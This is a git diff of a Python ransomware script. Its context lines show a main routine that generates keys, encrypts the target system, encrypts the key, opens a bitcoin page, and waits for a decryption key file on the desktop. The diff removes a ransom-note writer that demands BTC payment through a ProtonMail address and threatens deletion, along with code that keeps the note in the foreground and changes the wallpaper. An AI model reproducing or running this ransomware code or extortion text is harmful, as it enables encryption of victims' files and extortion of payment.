@@ -8,7 +8,6 @@ import requests # used to make get reqeust to api.ipify.org to get target machin
 import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
 import datetime # to give time limit on ransom note
 import subprocess # to create process for notepad and open ransom  note
-# import win32gui # used to get window text to see if ransom note is on top of all other windows
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
@@ -134,70 +133,9 @@ class RansomWare:
         # Open browser to the https://bitcoin.org so they know what bitcoin is
         webbrowser.open(url)
 
-
-    """def change_desktop_background(self):
-        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
-        # Go to specif url and download+save image using absolute path
-        path = f'{self.sysRoot}/Desktop/background.jpg'
-        urllib.request.urlretrieve(imageUrl, path)
-        SPI_SETDESKWALLPAPER = 20
-        # Access windows dlls for funcionality eg, changing dekstop wallpaper
-        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
-"""
-
-
-    def ransom_note(self):
-        date = datetime.date.today().strftime('%d-%B-Y')
-        with open('RANSOM_NOTE.txt', 'w') as f:
-            f.write(f'''
-The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
-There is no way to restore your data without a special key.
-Only we can decrypt your files!
-
-To purchase your key and restore your data, please follow these three easy steps:
-
-1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com
-
-2. You will recieve your personal BTC address for payment.
-   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
-   We will check to see if payment has been paid.
-
-3. You will receive a text file with your KEY that will unlock all your files. 
-   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
-
-WARNING:
-Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
-Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
--and there is a high chance you will lose your files forever.
-Do NOT send "PAID" button without paying, price WILL go up for disobedience.
-Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
-''')
-
-
-    """def show_ransom_note(self):
-        # Open the ransom note
-        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
-        count = 0 # Debugging/Testing
-        while True:
-            time.sleep(0.1)
-           # top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-            if top_window == 'RANSOM_NOTE - Notepad':
-                print('Ransom note is the top window - do nothing') # Debugging/Testing
-                pass
-            else:
-                print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
-                # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
-                time.sleep(0.1)
-                ransom.kill()
-                # Open the ransom note
-                time.sleep(0.1)
-                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
-            # sleep for 10 seconds
-            time.sleep(10)
-            count +=1 
-            if count == 5:
-                break
-"""
+    
+# possibly add code here that puts a message on desktop with information about being victims of ransomware
+    
     
     # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
     def put_me_on_desktop(self):
@@ -222,29 +160,19 @@ Do NOT think that we wont delete your files altogether and throw away the key if
                 pass
             time.sleep(10) # Debugging/Testing check for file on desktop ever 10 seconds
             print('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
-            # Would use below code in real life etc... above 10secs is just to "show" concept
-            # Sleep ~ 3 mins
-            # secs = 60
-            # mins = 3
-            # time.sleep((mins*secs))
 
 
 
 def main():
-    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
     rw = RansomWare()
     rw.generate_key()
     rw.crypt_system()
     rw.write_key()
     rw.encrypt_fernet_key()
-    #rw.change_desktop_background()
     rw.what_is_bitcoin()
-    #rw.ransom_note()
 
-    #t1 = threading.Thread(target=rw.show_ransom_note)
     t2 = threading.Thread(target=rw.put_me_on_desktop)
 
-    #t1.start()
     print('> RansomWare: Attack completed on target machine and system is encrypted') # Debugging/Testing
     print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') # Debugging/Testing
     t2.start()
